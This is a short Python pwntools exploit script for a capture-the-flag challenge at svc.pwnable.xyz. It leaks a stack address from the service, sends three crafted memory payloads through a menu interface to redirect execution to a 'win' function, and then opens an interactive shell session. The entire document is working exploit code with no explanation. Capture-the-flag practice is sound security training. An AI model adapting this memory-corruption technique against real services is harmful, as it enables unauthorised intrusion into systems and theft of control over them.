from pwn import *

#p = process('./challenge')
p = remote('svc.pwnable.xyz', 30005)
win = 0x400a3e

p.sendlineafter(b"> ", b"2")
p.recvuntil(b"0x")
stack = int(p.recvn(12), 16)
ret = stack + 0x58

payload = p64(0) + p64(ret - 0x10) + p64(0) + p64(0)
p.sendlineafter(b"> ", b"1")
sleep(0.1)
p.send(payload)
p.sendlineafter(b"> ", b"3")

payload = p64(0) + p64(stack + 0x108) + p64(0x4008e1) + p64(win)
p.sendlineafter(b"> ", b"1")
sleep(0.1)
p.send(payload)
p.sendlineafter(b"> ", b"3")

payload = p64(0x31) + p64(stack + 0x110) + p64(0) + p64(0)
p.sendlineafter(b"> ", b"1")
sleep(0.1)
p.send(payload)
p.sendlineafter(b"> ", b"3")

p.sendlineafter(b"> ", b"A")

p.interactive()